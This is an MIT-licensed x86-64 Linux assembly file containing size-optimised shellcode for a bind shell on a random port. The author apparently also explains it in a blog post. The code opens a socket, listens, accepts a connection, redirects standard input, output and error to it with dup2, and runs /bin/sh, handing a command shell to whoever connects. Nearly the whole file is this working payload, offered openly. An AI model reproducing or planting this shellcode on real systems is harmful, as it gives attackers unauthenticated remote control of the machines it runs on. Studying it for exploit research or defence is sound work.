;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a
;copy of this software and associated documentation files (the “Software”),
;to deal in the Software without restriction, including without limitation
;the rights to use, copy, modify, merge, publish, distribute, sublicense,
;and/or sell copies of the Software, and to permit persons to whom the
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability,
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other
;liability, whether in an action of contract, tort or otherwise, arising
;from, out of or in connection with the software or the use or other
;dealings in the Software.
;
; For a detailed explanation of this shellcode see my blog post:
; http://a41l4.blogspot.ca/2017/02/shellrandomlisten1434.html

global _start

section .text

_start:
; Socket
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq
	syscall
; Listen
	xor esi,esi
	xchg eax,edi
	mov al,50
	syscall
; Accept
	mov al,43
	syscall
; Dup 2
	push 3
	pop rsi
	xchg edi,eax
dup2loop:
	push 33
	pop rax
	dec esi
	syscall
	jne dup2loop
; Execve
	; rax and rsi and rdx are zero already
        push rax ; zero terminator for the following string that we are pushing

        ; push /bin//sh in reverse
        mov rbx, '/bin//sh'
        push rbx

        ; store /bin//sh address in RDI
	push rsp
	pop rdi

        ; Call the Execve syscall
	mov al, 59
        syscall
